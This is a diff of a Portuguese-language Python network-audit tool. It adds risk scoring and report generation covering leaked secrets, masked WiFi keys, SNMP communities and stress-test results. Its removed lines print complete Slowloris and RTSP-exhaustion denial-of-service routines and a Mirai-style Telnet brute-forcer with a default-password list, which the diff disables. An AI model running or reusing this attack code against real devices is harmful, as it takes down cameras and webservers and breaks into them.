+                issues.append(f"Amplificação {amp['servico'].upper()}: {amp['evidencia']}")
+                score += 12
+
+            for pth in host.get("paths_default", []):
+                issues.append(f"Path default acessível {pth['path']} ({pth['status']})")
+                score += 10
+
+            # Vazamentos confirmados em paths sensíveis (LEAK_PATTERNS)
+            for leak in host.get("secret_leaks", []) or []:
+                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
+                issues.append(f"[CRÍTICO] Vazamento em {leak['path']}: {tipos}")
+                score += 30 * len(leak.get("achados", [])) or 30
+
+            # PSK / chave WiFi vazada em página de status do roteador
+            for psk in host.get("psk_leaks", []) or []:
+                issues.append(f"[CRÍTICO] PSK WiFi exposta na porta {psk['port']} ({psk['tipo']})")
+                score += 35
+
+            # SNMP comunidades aceitas além de public
+            for snmp in host.get("snmp_creds", []) or []:
+                comm = snmp.get("community", "")
+                if comm == "public":
+                    score += 5  # já contado em "SNMP exposto"
+                else:
+                    issues.append(f"[ALTO] SNMP community '{comm}' aceita — potencial leitura/escrita")
+                    score += 25
+
+            # Sugestões de credenciais padrão (informativo, sem exploit)
+            for sug in host.get("creds_padrao_sugeridas", []) or []:
+                amostras = ", ".join(sug["pares"][:3])
+                issues.append(f"[INFO] Modelo '{sug['vendor_detectado']}' → "
+                              f"creds padrão prováveis: {amostras}")
+                score += 5
+
+            # Absorve vulns identificadas pelo PortScanner --Insane
+            for v in host.get("vulns", []) or []:
+                sev = v.get("severidade", "info")
+                inc = {"critica": 25, "alta": 15, "media": 8, "info": 3}.get(sev, 3)
+                score += inc
+                issues.append(f"[{sev.upper()}] {v.get('dica_cve', '')[:80]}")
+
+            # Findings vindos do boost --root
+            for rf in host.get("root_findings", []) or []:
+                tipo = rf.get("tipo", "")
+                sev = rf.get("severidade", "media")
+                inc = {"alta": 25, "media": 12, "info": 5}.get(sev, 8)
+                score += inc
+                issues.append(f"[ROOT/{sev.upper()}] {tipo}: {rf.get('evidencia', '')[:80]}")
+
+            if not issues:
+                continue
+            findings.append({
+                "ip": ip,
+                "score": min(score, 100),
+                "severity": "high" if score >= 60 else ("medium" if score >= 30 else "low"),
+                "issues": issues,
+            })
+
+        self.risk_findings = sorted(findings, key=lambda x: x["score"], reverse=True)
 
     async def _rtsp_discovery(self):
         self.ui.info("RTSP Stream Discovery...")
@@ -1480,12 +7354,12 @@ class GodMode:
             return False
 
     def _print_god_summary(self):
-        if self.found_creds:
-            rows = [[c["ip"], str(c["port"]), c["user"], c["password"], c["vendor"]]
-                    for c in self.found_creds]
-            self.ui.table("⚠ CREDENCIAIS ENCONTRADAS",
-                           [("IP", C_RED), ("Port", C_RED), ("User", C_YELLOW),
-                            ("Password", C_YELLOW), ("Vendor", C_WHITE)], rows)
+        if self.risk_findings:
+            rows = [[r["ip"], str(r["score"]), r["severity"], "; ".join(r["issues"][:2])]
+                    for r in self.risk_findings[:25]]
+            self.ui.table("Risk Findings",
+                          [("IP", C_RED), ("Score", C_YELLOW), ("Severity", C_WHITE), ("Top Issues", C_DIM)],
+                          rows)
         if self.rtsp_streams:
             rows = [[s["ip"], s["url"]] for s in self.rtsp_streams]
             self.ui.table("RTSP Streams",
@@ -1539,142 +7413,13 @@ class GodMode:
             self.ui.error(f"Erro no ONVIF: {e}")
 
     async def run_slowloris(self):
-        self.ui.section("SLOWLORIS IOT ATTACK")
-        if not self.ui.consent("Ataque destrutivo (derruba webservers). Continuar?"):
-            return
-        web_hosts = [h for h in self.hosts if set(h.get("ports", [])).intersection({80, 8080})]
-        if not web_hosts:
-            self.ui.warn("Nenhum alvo web (porta 80/8080) encontrado.")
-            return
-
-        async def attack_loris(ip: str, port: int):
-            self.ui.info(f"  -> Atacando {ip}:{port} (abrindo 200 conexões lentas)")
-            sockets = []
-            for _ in range(200):
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(4)
-                    s.connect((ip, port))
-                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
-                    s.send(f"Host: {ip}\r\n".encode("utf-8"))
-                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
-                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-                    sockets.append(s)
-                except Exception:
-                    pass
-            
-            end_time = time.time() + 15  # 15 seconds attack
-            while time.time() < end_time and sockets:
-                for s in list(sockets):
-                    try:
-                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
-                    except socket.error:
-                        sockets.remove(s)
-                await asyncio.sleep(2)
-            
-            for s in sockets:
-                try: s.close()
-                except: pass
-            self.ui.success(f"  [LORIS] Ataque em {ip} concluído.")
-
-        tasks = []
-        for h in web_hosts:
-            for p in [80, 8080]:
-                if p in h.get("ports", []):
-                    tasks.append(attack_loris(h["ip"], p))
-        await asyncio.gather(*tasks)
+        self.ui.warn("Modo --slowloris desativado por seguranca.")
 
     async def run_rtsp_kill(self):
-        self.ui.section("RTSP CONNECTION EXHAUSTION")
-        if not self.ui.consent("Ataque destrutivo (trava câmeras). Continuar?"):
-            return
-        rtsp_hosts = [h for h in self.hosts if 554 in h.get("ports", [])]
-        if not rtsp_hosts:
-            self.ui.warn("Nenhum host com porta 554 (RTSP) aberta.")
-            return
-
-        async def exhaust_rtsp(ip: str):
-            self.ui.info(f"  -> Esgotando pool RTSP de {ip} (100 threads)")
-            sockets = []
-            for i in range(100):
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(3)
-                    s.connect((ip, 554))
-                    # Manda SETUP malformado/incompleto e prende a thread da câmera
-                    req = f"SETUP rtsp://{ip}/ RTSP/1.0\r\nCSeq: {i}\r\nTransport: RTP/AVP;unicast;client_port=8000-8001\r\n\r\n"
-                    s.send(req.encode())
-                    sockets.append(s)
-                except Exception:
-                    pass
-            
-            self.ui.info(f"  -> {len(sockets)} conexões RTSP mantidas. Segurando por 10s...")
-            await asyncio.sleep(10)
-            
-            for s in sockets:
-                try: s.close()
-                except: pass
-            self.ui.success(f"  [RTSP-KILL] Câmera {ip} possivelmente reiniciada.")
-
-        await asyncio.gather(*[exhaust_rtsp(h["ip"]) for h in rtsp_hosts])
+        self.ui.warn("Modo --rtsp-kill desativado por seguranca.")
 
     async def run_mirai(self):
-        self.ui.section("MIRAI BRUTE-FORCE (TELNET/SSH)")
-        mirai_hosts = [h for h in self.hosts if 22 in h.get("ports", []) or 23 in h.get("ports", [])]
-        if not mirai_hosts:
-            self.ui.warn("Nenhum host com Telnet/SSH ativo.")
-            return
-            
-        creds = [
-            ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), 
-            ("admin", "admin"), ("root", "888888"), ("root", "xmhdipc"), 
-            ("root", "default"), ("root", "juantech"), ("root", "123456"), 
-            ("root", "54321"), ("support", "support"), ("root", ""), 
-            ("admin", "password"), ("root", "root"), ("admin", ""), 
-            ("admin", "1111"), ("admin", "1234"), ("admin", "12345"),
-            ("admin", "54321"), ("admin", "7777777"), ("admin", "12345678"),
-            ("admin", "123456"), ("root", "12345678"), ("root", "pass"),
-            ("guest", "guest"), ("user", "user"), ("admin", "pass")
-        ]
-        
-        async def try_telnet(ip: str, user: str, pswd: str) -> bool:
-            try:
-                r, w = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=2)
-                
-                # Aguarda prompt de login
-                await asyncio.wait_for(r.read(1024), timeout=2)
-                w.write(f"{user}\r\n".encode())
-                await w.drain()
-                
-                # Aguarda prompt de senha
-                await asyncio.wait_for(r.read(1024), timeout=2)
-                w.write(f"{pswd}\r\n".encode())
-                await w.drain()
-                
-                # Verifica resposta
-                resp = await asyncio.wait_for(r.read(1024), timeout=2)
-                w.close()
-                await w.wait_closed()
-                
-                resp_text = resp.decode(errors="ignore").lower()
-                return not any(bad in resp_text for bad in ["incorrect", "invalid", "failed", "login:"])
-            except Exception:
-                return False
-
-        sem = asyncio.Semaphore(50)
-        async def crack_host(h: Dict):
-            ip = h["ip"]
-            if 23 in h.get("ports", []):
-                self.ui.info(f"  -> Brute-forcing Telnet (23) em {ip}...")
-                for user, pswd in creds:
-                    async with sem:
-                        success = await try_telnet(ip, user, pswd)
-                        if success:
-                            self.found_creds.append({"ip": ip, "port": 23, "user": user, "password": pswd, "vendor": "Mirai-Telnet"})
-                            self.ui.success(f"  [MIRAI] Telnet Cracked! {ip}:23 -> {user}:{pswd}")
-                            return
-
-        await asyncio.gather(*[crack_host(h) for h in mirai_hosts])
+        self.ui.warn("Modo --mirai desativado por seguranca.")
 
 
 # ═══════════════════ REPORT ENGINE ════════════════════════════
@@ -1684,12 +7429,16 @@ class ReportEngine:
 
     def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                  hosts: List[Dict], stress_results: Dict = None,
-                 god_data: Dict = None):
+                 god_data: Dict = None,
+                 kamikase_data: Dict = None,
+                 ctx_priv: "Optional[ContextoPrivilegio]" = None):
         self.ui = ui
         self.det = detector
         self.hosts = hosts
         self.stress = stress_results or {}
         self.god = god_data or {}
+        self.kamikase = kamikase_data or {}
+        self.ctx_priv = ctx_priv
         self.timestamp = datetime.now()
 
     def generate(self):
@@ -1702,85 +7451,495 @@ class ReportEngine:
         self.ui.success(f"HTML: {html_path}")
         self.ui.success(f"TXT:  {txt_path}")
 
+    # ── Helpers didáticos: explicações inline e exemplos ──────
+
+    def _explicacao_html(self, chave: str, exemplo: str = "") -> str:
+        """Bloco <details> colapsável explicando um tipo de achado.
+        `exemplo` é o trecho específico desta varredura — quando passado,
+        aparece como 'Exemplo encontrado nesta rede'."""
+        info = EXPLICACOES.get(chave)
+        if not info:
+            return ""
+        ex_html = ""
+        if exemplo:
+            ex_html = (f"<p><strong>Exemplo encontrado:</strong> "
+                       f"<code>{html.escape(exemplo[:300])}</code></p>")
+        return (
+            f'<details class="didatica"><summary>📖 O que é "{html.escape(info["titulo"])}" '
+            f'e como validar</summary>'
+            f'<p><strong>Resumo:</strong> {html.escape(info["resumo"])}</p>'
+            f'<p><strong>Como validar manualmente:</strong> {html.escape(info["como_validar"])}</p>'
+            f'<p><strong>Impacto:</strong> {html.escape(info["impacto"])}</p>'
+            f'{ex_html}'
+            f'</details>'
+        )
+
+    def _explicacao_txt(self, chave: str, indent: str = "  ") -> List[str]:
+        """Bloco textual padronizado para explicar um tipo de achado no TXT."""
+        info = EXPLICACOES.get(chave)
+        if not info:
+            return []
+        return [
+            f"{indent}─ {info['titulo']} ─",
+            f"{indent}  • O que é: {info['resumo']}",
+            f"{indent}  • Como validar: {info['como_validar']}",
+            f"{indent}  • Impacto: {info['impacto']}",
+        ]
+
+    def _classificar_finding_para_explicacao(self, issue_text: str) -> Optional[str]:
+        """Mapeia uma string de issue (do _assess_risks) para uma chave em
+        EXPLICACOES. Retorna None se não encontrar correspondência."""
+        t = issue_text.lower()
+        if "telnet" in t and "expost" in t: return "porta_telnet"
+        if "ftp" in t and "expost" in t: return "porta_ftp"
+        if "smb" in t and "expost" in t: return "porta_smb"
+        if "rdp" in t and "expost" in t: return "porta_rdp"
+        if "rtsp" in t and "expost" in t: return "porta_rtsp"
+        if "snmp" in t and ("community" in t or "private" in t or "expost" in t):
+            return "snmp_community_extra" if "community" in t else "porta_snmp"
+        if "dns" in t and "expost" in t: return "porta_dns"
+        if "ntp" in t and "expost" in t: return "porta_ntp"
+        if "redis" in t: return "porta_redis"
+        if "mongo" in t: return "porta_mongo"
+        if "elastic" in t: return "porta_elastic"
+        if "docker" in t: return "porta_docker"
+        if "vazamento" in t or "leak" in t: return "secret_leak"
+        if "psk" in t: return "psk_exposto"
+        if "creds padrão" in t or "creds padrao" in t: return "creds_padrao"
+        if "amplificação" in t or "amplificacao" in t: return "amplificacao"
+        if "path default" in t: return "path_default"
+        if "headers de segurança" in t: return "headers_seguranca"
+        if "openssh" in t: return "ssh_versao_antiga"
+        if "[crítico]" in t or "[critico]" in t: return "vuln_critica"
+        if "[alto]" in t: return "vuln_alta"
+        if "[médio]" in t or "[medio]" in t: return "vuln_media"
+        if "[info]" in t: return "vuln_info"
+        return None
+
+    def _coletar_chaves_explicacao(self) -> List[str]:
+        """Varre todos os achados deste scan e retorna a lista de tipos
+        (chaves de EXPLICACOES) que efetivamente apareceram. Usado para
+        construir o glossário do TXT só com o que é relevante."""
+        chaves: Set[str] = set()
+        # Vulns por severidade
+        for h in self.hosts:
+            for v in h.get("vulns", []) or []:
+                sev = v.get("severidade", "info")
+                chaves.add(f"vuln_{sev}")
+            if h.get("secret_leaks"): chaves.add("secret_leak")
+            if h.get("psk_leaks"): chaves.add("psk_exposto")
+            for snmp in h.get("snmp_creds", []) or []:
+                if snmp.get("community", "") != "public":
+                    chaves.add("snmp_community_extra")
+                else:
+                    chaves.add("porta_snmp")
+            if h.get("creds_padrao_sugeridas"): chaves.add("creds_padrao")
+            if h.get("amplificacao"): chaves.add("amplificacao")
+            if h.get("paths_default"): chaves.add("path_default")
+            ports = set(h.get("ports", []))
+            for porta, chave in [(23, "porta_telnet"), (21, "porta_ftp"),
+                                 (445, "porta_smb"), (3389, "porta_rdp"),
+                                 (554, "porta_rtsp"), (53, "porta_dns"),
+                                 (123, "porta_ntp"), (6379, "porta_redis"),
+                                 (27017, "porta_mongo"), (9200, "porta_elastic"),
+                                 (2375, "porta_docker")]:
+                if porta in ports:
+                    chaves.add(chave)
+        if self.stress.get("godfall"): chaves.add("godfall_resultado")
+        if self.ctx_priv and self.ctx_priv.ativo: chaves.add("privilegio_root")
+        if self.kamikase.get("ativo"): chaves.add("kamikase")
+        # Detecta tipos de root_findings presentes
+        for h in self.hosts:
+            for rf in h.get("root_findings", []) or []:
+                tipo = rf.get("tipo", "")
+                if tipo == "arp_spoof_detected": chaves.add("arp_spoofing_detect")
+                elif tipo == "lldp_cdp": chaves.add("lldp_cdp")
+                elif tipo == "dns_cache_snoop": chaves.add("dns_snooping")
+        chaves.add("inventario_hosts")
+        return sorted(chaves)
+
     def _write_html(self, path: Path):
+        risks = self.god.get("risks", [])
+        risk_map = {r["ip"]: r for r in risks}
+        godfall = self.stress.get("godfall", {})
+        lat = self.stress.get("latency", {})
+        open_ports = sum(len(h.get("ports", [])) for h in self.hosts)
+
         hosts_rows = ""
         for h in self.hosts:
             ports_str = ", ".join(str(p) for p in h.get("ports", [])[:15])
             svcs = ", ".join(f"{p}:{s.get('service','?')}"
-                            for p, s in list(h.get("services", {}).items())[:8])
-            web = ""
-            for w in h.get("web_info", []):
-                web += f"{w.get('title','')} "
+                             for p, s in list(h.get("services", {}).items())[:8])
+            web_titles = " ".join(w.get("title", "") for w in h.get("web_info", []))
+            risk = risk_map.get(h["ip"], {})
+            hostname = h.get("hostname", "") or "—"
+            tipo = h.get("device_type", "desconhecido")
+            confs = h.get("confiancas", {})
+            conf_avg = (sum(confs.values()) // max(1, len(confs))) if confs else 0
+            fontes = ", ".join(h.get("fontes", [])) or "—"
             hosts_rows += f"""<tr>
-                <td>{html.escape(h['ip'])}</td><td>{html.escape(h.get('mac','N/A'))}</td>
-                <td>{html.escape(h.get('vendor','?'))}</td><td>{html.escape(h.get('os','?'))}</td>
-                <td>{html.escape(ports_str)}</td><td>{html.escape(svcs)}</td>
-                <td>{html.escape(web.strip()[:50])}</td></tr>"""
+                <td>{html.escape(h['ip'])}</td>
+                <td>{html.escape(hostname)}</td>
+                <td><span class="badge tipo-{html.escape(tipo)}">{html.escape(tipo)}</span></td>
+                <td>{html.escape(h.get('mac','N/A'))}</td>
+                <td>{html.escape(h.get('vendor','?'))}</td>
+                <td>{html.escape(h.get('os','?'))}</td>
+                <td>{html.escape(ports_str)}</td>
+                <td>{html.escape(svcs)}</td>
+                <td>{html.escape(web_titles.strip()[:40])}</td>
+                <td>{conf_avg}%</td>
+                <td>{risk.get('score', 0)}</td>
+                <td class="meta">{html.escape(fontes)}</td></tr>"""
 
-        creds_section = ""
-        creds = self.god.get("creds", [])
-        if creds:
-            creds_rows = "".join(
-                f"<tr><td>{html.escape(c['ip'])}</td><td>{c['port']}</td>"
-                f"<td>{html.escape(c['user'])}</td><td>{html.escape(c['password'])}</td>"
-                f"<td>{html.escape(c.get('vendor',''))}</td></tr>" for c in creds)
-            creds_section = f"""<div class="card cred-card">
-                <h2>⚠ Credenciais Encontradas</h2>
-                <table><tr><th>IP</th><th>Port</th><th>User</th><th>Password</th>
-                <th>Vendor</th></tr>{creds_rows}</table></div>"""
+        # Card de Vulnerabilidades (vindas do --Insane)
+        vuln_rows = ""
+        total_vulns = 0
+        for h in self.hosts:
+            for v in h.get("vulns", []) or []:
+                total_vulns += 1
+                sev = v.get("severidade", "info")
+                vuln_rows += (
+                    f"<tr class='sev-{html.escape(sev)}'>"
+                    f"<td>{html.escape(h['ip'])}</td>"
+                    f"<td>{v.get('porta', '?')}</td>"
+                    f"<td>{html.escape(v.get('servico', '?'))}</td>"
+                    f"<td><span class='badge sev-{html.escape(sev)}'>{html.escape(sev.upper())}</span></td>"
+                    f"<td>{html.escape(v.get('dica_cve', '')[:120])}</td>"
+                    f"<td>{'sim' if v.get('verificada') else 'não'}</td></tr>"
+                )
+        vuln_section = ""
+        if vuln_rows:
+            # Coleta as severidades que apareceram para mostrar didática só do relevante
+            sevs_presentes = sorted({(v.get("severidade", "info"))
+                                      for h in self.hosts
+                                      for v in h.get("vulns", []) or []})
+            blocos_sev = "".join(self._explicacao_html(f"vuln_{s}") for s in sevs_presentes)
+            vuln_section = f"""<div class="card"><h2>Vulnerabilidades (Insane)</h2>
+            <p class="meta">Total de achados: {total_vulns}</p>
+            <div class="didatica-wrap">
+              <p class="didatica-intro">📖 <strong>Como ler esta seção:</strong> cada linha é uma falha potencial detectada por banner/regex. Severidades vão de <span class="badge sev-info">INFO</span> a <span class="badge sev-critica">CRÍTICA</span>. Nenhum exploit foi executado — são <em>indícios</em> que precisam ser confirmados. Veja explicações abaixo:</p>
+              {blocos_sev}
+            </div>
+            <div class="table-wrap"><table><tr><th>IP</th><th>Porta</th><th>Serviço</th><th>Severidade</th><th>Dica/CVE</th><th>Verificada</th></tr>
+            {vuln_rows}</table></div></div>"""
+
+        # ── Credential & Secret Hunting (passivo) ──────────────
+        leak_rows = ""
+        psk_rows = ""
+        snmp_rows = ""
+        cred_sug_rows = ""
+        total_leaks = total_psks = total_snmp_extra = 0
+        for h in self.hosts:
+            for leak in h.get("secret_leaks", []) or []:
+                total_leaks += 1
+                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
+                trechos = " | ".join(html.escape(a["trecho"]) for a in leak.get("achados", []))
+                leak_rows += (
+                    f"<tr class='sev-critica'><td>{html.escape(h['ip'])}</td>"
+                    f"<td>{html.escape(leak.get('path', ''))}</td>"
+                    f"<td>{leak.get('status', '?')}</td>"
+                    f"<td><span class='badge sev-critica'>{html.escape(tipos)}</span></td>"
+                    f"<td class='meta'>{trechos[:200]}</td></tr>"
+                )
+            for psk in h.get("psk_leaks", []) or []:
+                total_psks += 1
+                # Mascarar PSK: mostrar 3 primeiros e 2 últimos chars
+                p = psk.get("psk", "")
+                p_mask = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
+                psk_rows += (
+                    f"<tr class='sev-critica'><td>{html.escape(h['ip'])}</td>"
+                    f"<td>{psk.get('port', '?')}</td>"
+                    f"<td>{html.escape(psk.get('tipo', ''))}</td>"
+                    f"<td><code>{html.escape(p_mask)}</code></td>"
+                    f"<td>{len(p)}</td></tr>"
+                )
+            for snmp in h.get("snmp_creds", []) or []:
+                comm = snmp.get("community", "")
+                if comm and comm != "public":
+                    total_snmp_extra += 1
+                snmp_rows += (
+                    f"<tr><td>{html.escape(h['ip'])}</td>"
+                    f"<td><span class='badge sev-{'critica' if comm != 'public' else 'media'}'>"
+                    f"{html.escape(comm)}</span></td>"
+                    f"<td>{html.escape(snmp.get('sys_descr', '')[:80])}</td></tr>"
+                )
+            for sug in h.get("creds_padrao_sugeridas", []) or []:
+                cred_sug_rows += (
+                    f"<tr><td>{html.escape(h['ip'])}</td>"
+                    f"<td>{html.escape(sug.get('vendor_detectado', '?'))}</td>"
+                    f"<td>{html.escape(sug.get('fonte', '?'))}</td>"
+                    f"<td class='meta'>{html.escape(', '.join(sug.get('pares', [])[:6]))}</td></tr>"
+                )
+
+        cred_section = ""
+        if leak_rows or psk_rows or snmp_rows or cred_sug_rows:
+            partes = []
+            partes.append(f"<p class='meta'>Segredos confirmados: {total_leaks} | "
+                          f"PSKs WiFi expostas: {total_psks} | "
+                          f"SNMP communities além de public: {total_snmp_extra}</p>")
+            partes.append(
+                "<p class='didatica-intro'>📖 <strong>Como ler esta seção:</strong> "
+                "esta caça é 100% passiva — apenas lemos o que o servidor entrega "
+                "publicamente. Não tentamos login. Cada subtipo abaixo tem "
+                "explicação detalhada do que significa, como confirmar manualmente "
+                "e qual o impacto real.</p>")
+            if leak_rows:
+                # Pega primeiro tipo encontrado como exemplo
+                exemplo_leak = ""
+                for h in self.hosts:
+                    for lk in h.get("secret_leaks", []) or []:
+                        if lk.get("achados"):
+                            exemplo_leak = (f"{h['ip']}{lk.get('path', '')} → "
+                                            f"{lk['achados'][0].get('tipo', '')}")
+                            break
+                    if exemplo_leak: break
+                partes.append("<h3>Vazamentos confirmados (LEAK_PATTERNS)</h3>")
+                partes.append(self._explicacao_html("secret_leak", exemplo_leak))
+                partes.append(
+                    "<div class='table-wrap'><table>"
+                    "<tr><th>IP</th><th>Path</th><th>Status</th><th>Tipo</th><th>Trecho</th></tr>"
+                    f"{leak_rows}</table></div>")
+            if psk_rows:
+                exemplo_psk = ""
+                for h in self.hosts:
+                    for psk in h.get("psk_leaks", []) or []:
+                        p = psk.get("psk", "")
+                        masc = (p[:3] + "***" + p[-2:]) if len(p) > 5 else "*****"
+                        exemplo_psk = f"{h['ip']} → PSK {masc} (origem: {psk.get('tipo', '?')})"
+                        break
+                    if exemplo_psk: break
+                partes.append("<h3>PSK WiFi expostas em JS/HTML</h3>")
+                partes.append(self._explicacao_html("psk_exposto", exemplo_psk))
+                partes.append(
+                    "<div class='table-wrap'><table>"
+                    "<tr><th>IP</th><th>Porta</th><th>Origem</th><th>PSK (mascarada)</th><th>Tam.</th></tr>"
+                    f"{psk_rows}</table></div>")
+            if snmp_rows:
+                exemplo_snmp = ""
+                for h in self.hosts:
+                    for snmp in h.get("snmp_creds", []) or []:
+                        exemplo_snmp = (f"{h['ip']} aceitou community "
+                                        f"'{snmp.get('community', '')}' → "
+                                        f"{snmp.get('sys_descr', '')[:60]}")
+                        break
+                    if exemplo_snmp: break
+                # Decide qual explicação usar
+                tem_extra = any(
+                    s.get("community") != "public"
+                    for h in self.hosts
+                    for s in (h.get("snmp_creds", []) or []))
+                partes.append("<h3>SNMP — comunidades aceitas</h3>")
+                partes.append(self._explicacao_html(
+                    "snmp_community_extra" if tem_extra else "porta_snmp",
+                    exemplo_snmp))
+                partes.append(
+                    "<div class='table-wrap'><table>"
+                    "<tr><th>IP</th><th>Community</th><th>sysDescr</th></tr>"
+                    f"{snmp_rows}</table></div>")
+            if cred_sug_rows:
+                exemplo_creds = ""
+                for h in self.hosts:
+                    for sug in h.get("creds_padrao_sugeridas", []) or []:
+                        exemplo_creds = (f"{h['ip']} ({sug.get('vendor_detectado', '')}) → "
+                                         f"{', '.join(sug.get('pares', [])[:3])}")
+                        break
+                    if exemplo_creds: break
+                partes.append("<h3>Credenciais padrão prováveis (por modelo)</h3>")
+                partes.append(self._explicacao_html("creds_padrao", exemplo_creds))
+                partes.append(
+                    "<div class='table-wrap'><table>"
+                    "<tr><th>IP</th><th>Vendor</th><th>Fonte</th><th>Pares prováveis (user:pass)</th></tr>"
+                    f"{cred_sug_rows}</table></div>")
+            cred_section = ('<div class="card"><h2>Credential & Secret Hunting (passivo)</h2>'
+                            + "".join(partes) + "</div>")
+
+        risk_rows = "".join(
+            f"<tr><td>{html.escape(r['ip'])}</td><td>{r['score']}</td><td>{html.escape(r['severity'])}</td>"
+            f"<td>{html.escape('; '.join(r.get('issues', [])[:3]))}</td></tr>"
+            for r in risks[:40]
+        )
+        risk_section = ""
+        if risk_rows:
+            # Coleta tipos únicos de issues vistos para mostrar didática só do relevante
+            tipos_vistos: Set[str] = set()
+            for r in risks:
+                for issue in r.get("issues", []):
+                    chave = self._classificar_finding_para_explicacao(issue)
+                    if chave:
+                        tipos_vistos.add(chave)
+            blocos_tipos = "".join(self._explicacao_html(c) for c in sorted(tipos_vistos))
+            risk_section = f"""<div class="card"><h2>Risk Findings — Pontuação Consolidada por Host</h2>
+            <div class="didatica-wrap">
+              <p class="didatica-intro">📖 <strong>Como ler:</strong> cada host recebe um score 0–100 calculado somando os achados encontrados (Telnet exposto, SMB ativo, vulns, leaks, etc.). Severity vai de <em>low</em> (&lt;30) a <em>high</em> (&ge;60). Abaixo, cada tipo de issue que apareceu nesta varredura está explicado:</p>
+              {blocos_tipos}
+            </div>
+            <div class="table-wrap"><table><tr><th>IP</th><th>Score</th><th>Severity</th><th>Issues</th></tr>
+            {risk_rows}</table></div></div>"""
+
+        godfall_section = ""
+        if godfall:
+            per_host = godfall.get("per_host", [])
+            phases = godfall.get("phases", [])
+            aborted = bool(godfall.get("aborted", False))
+            abort_reason = str(godfall.get("abort_reason", "") or "")
+            recovery = godfall.get("recovery", {}) or {}
+            rec_txt = "recovered" if recovery.get("recovered") else "not recovered"
+            rec_s = recovery.get("seconds", 0)
+            phase_rows = "".join(
+                f"<tr><td>{html.escape(p['name'])}</td><td>{p['attempts_per_host']}</td><td>{p['concurrency']}</td>"
+                f"<td>{p['delay_ms']}ms</td><td>{p['latency_snapshot_ms']}ms</td>"
+                f"<td>{p.get('success_rate_pct', 0)}%</td>"
+                f"<td>tier {p.get('barrage_tier', 0)}</td>"
+                f"<td>{p.get('barrage_packets', 0):,}</td></tr>"
+                for p in phases
+            )
+            pf_rows = "".join(
+                f"<tr><td>{html.escape(h['ip'])}</td><td>{h['attempts']}</td><td>{h['success_rate']}%</td>"
+                f"<td>{h['avg_rps']}</td></tr>" for h in per_host[:30]
+            )
+            modo_godfall = godfall.get("modo", "fases")
+            barrage_total = godfall.get("barrage_packets_total", 0)
+            iperf_meta = godfall.get("baseline_iperf", {}) or {}
+            iperf_linha = ""
+            if iperf_meta:
+                tcp = iperf_meta.get("tcp", {}) or {}
+                udp = iperf_meta.get("udp", {}) or {}
+                tcp_mbps = (tcp.get("sum_sent", {}).get("bits_per_second", 0) or 0) / 1e6
+                udp_mbps = (udp.get("sum", {}).get("bits_per_second", 0) or 0) / 1e6
+                udp_jit = (udp.get("sum", {}).get("jitter_ms", 0) or 0)
+                udp_loss = (udp.get("sum", {}).get("lost_percent", 0) or 0)
+                iperf_linha = (f"<p class='meta'>Baseline iperf3: TCP {tcp_mbps:.1f} Mbps | "
+                               f"UDP {udp_mbps:.1f} Mbps | jitter {udp_jit:.2f}ms | loss {udp_loss:.1f}%</p>")
+            exemplo_god = (f"Avg success: {godfall.get('avg_success_rate', 0)}% após "
+                           f"{barrage_total:,} pacotes UDP de barragem. "
+                           f"Status: {'abortado' if aborted else 'concluído'}.")
+            godfall_section = f"""<div class="card"><h2>Godfall Titan Sweep ({html.escape(modo_godfall)})</h2>
+            <p class="meta">Hosts: {godfall.get('hosts_tested', 0)} | Attempts/host: {godfall.get('attempts_per_host', 0)} | Avg success: {godfall.get('avg_success_rate', 0)}% | Barrage total: {barrage_total:,} pacotes | {('ABORTADO' if aborted else 'CONCLUÍDO')} | Recovery: {rec_txt} ({rec_s}s)</p>
+            {iperf_linha}
+            <p class="meta">{html.escape(abort_reason) if aborted else ''}</p>
+            <div class="didatica-wrap">
+              {self._explicacao_html("godfall_resultado", exemplo_god)}
+            </div>
+            <div class="table-wrap"><table><tr><th>Fase</th><th>Tent./Host</th><th>Concorrência</th><th>Delay</th><th>Latência</th><th>Sucesso</th><th>Barrage</th><th>Pacotes</th></tr>
+            {phase_rows}</table></div>
+            <div class="table-wrap"><table><tr><th>IP</th><th>Attempts</th><th>Success</th><th>Req/s</th></tr>
+            {pf_rows}</table></div></div>"""
 
         lat_section = ""
-        lat = self.stress.get("latency", {})
         if lat:
-            lat_section = f"""<div class="card"><h2>Latência durante Stress</h2>
-                <table><tr><th>Baseline</th><th>Avg</th><th>Min</th><th>Max</th>
-                <th>Loss</th></tr><tr><td>{lat.get('baseline_ms',0)}ms</td>
-                <td>{lat.get('avg_ms',0)}ms</td><td>{lat.get('min_ms',0)}ms</td>
-                <td>{lat.get('max_ms',0)}ms</td>
-                <td>{lat.get('packet_loss_pct',0)}%</td></tr></table></div>"""
+            lat_section = f"""<div class="card"><h2>Latency During Stress</h2>
+            <div class="table-wrap"><table><tr><th>Baseline</th><th>Avg</th><th>Min</th><th>Max</th><th>Loss</th></tr>
+            <tr><td>{lat.get('baseline_ms',0)}ms</td><td>{lat.get('avg_ms',0)}ms</td>
+            <td>{lat.get('min_ms',0)}ms</td><td>{lat.get('max_ms',0)}ms</td>
+            <td>{lat.get('packet_loss_pct',0)}%</td></tr></table></div></div>"""
+
+        # ── Card: Privilege Mode ──────────────────────────────
+        privilege_section = ""
+        if self.ctx_priv and self.ctx_priv.ativo:
+            caps = sorted(self.ctx_priv.capabilities)
+            caps_html = " ".join(
+                f"<span class='badge sev-info'>{html.escape(c)}</span>" for c in caps)
+            privilege_section = f"""<div class="card"><h2>Privilege Mode — Apex Militar</h2>
+            <p class="meta">Plataforma: <strong>{html.escape(self.ctx_priv.plataforma)}</strong> |
+            Motor: <strong>{html.escape(self.ctx_priv.motor)}</strong> |
+            Capabilities: {len(caps)}</p>
+            <div class="didatica-wrap">{self._explicacao_html("privilegio_root")}</div>
+            <p>{caps_html}</p>
